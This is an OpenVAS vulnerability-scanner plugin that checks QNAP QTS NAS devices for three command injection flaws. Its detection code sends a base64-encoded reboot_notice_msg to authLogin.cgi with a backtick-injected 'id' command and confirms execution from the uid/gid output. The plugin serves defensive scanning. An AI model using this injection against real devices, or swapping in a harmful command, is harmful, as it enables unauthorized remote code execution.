###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_qnap_qts_20170313_remote.nasl 12260 2018-11-08 12:46:52Z cfischer $
#
# QNAP QTS Multiple Arbitrary Command Execution Vulnerabilities (Remote)
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE_PREFIX = "cpe:/h:qnap";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140297");
  script_version("$Revision: 12260 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-08 13:46:52 +0100 (Thu, 08 Nov 2018) $");
  script_tag(name:"creation_date", value:"2017-08-15 08:57:34 +0700 (Tue, 15 Aug 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2017-6359", "CVE-2017-6360", "CVE-2017-6361");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("QNAP QTS Multiple Arbitrary Command Execution Vulnerabilities (Remote)");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_qnap_nas_detect.nasl");
  script_mandatory_keys("qnap/qts");

  script_tag(name:"summary", value:"QNAP QTS is prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"QNAP QTS is prone to multiple vulnerabilities:

  - Command Injection in utilRequest.cgi cancel_trash_recovery 'pid'. (CVE-2017-6359)

  - Command Injection in userConfig.cgi cloudPersonalSmtp 'hash'. (CVE-2017-6360)

  - Command Injection in authLogin.cgi 'reboot_notice_msg' (CVE-2017-6361)");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"QNAP QTS prior to 4.2.4 Build 20170313.");

  script_tag(name:"solution", value:"Update to QNAP QTS  4.2.4 Build 20170313 or newer.");

  script_xref(name:"URL", value:"https://www.qnap.com/en-us/releasenotes/");
  script_xref(name:"URL", value:"https://sintonen.fi/advisories/qnap-qts-multiple-rce-vulnerabilities.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, first_cpe_only: TRUE, service: "www"))
  exit(0);

port = infos["port"];
CPE = infos["cpe"];

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

date = unixtime() % 100000000;
msg = "QNAPVJBD0" + date + "      Disconnect  14`(echo;id)>&2`";
msg = base64(str: msg);

url = dir + "/cgi-bin/authLogin.cgi?reboot_notice_msg=" + msg;

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "uid=[0-9]+.*gid=[0-9]+") {
  uid = eregmatch(pattern: "uid=[0-9]+.*gid=[0-9]+.*,[0-9]+\([a-zA-Z]+\)", string: res);
  report = "It was possible to execute the 'id' command.\n\nResult: " + uid[0] + "\n";
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
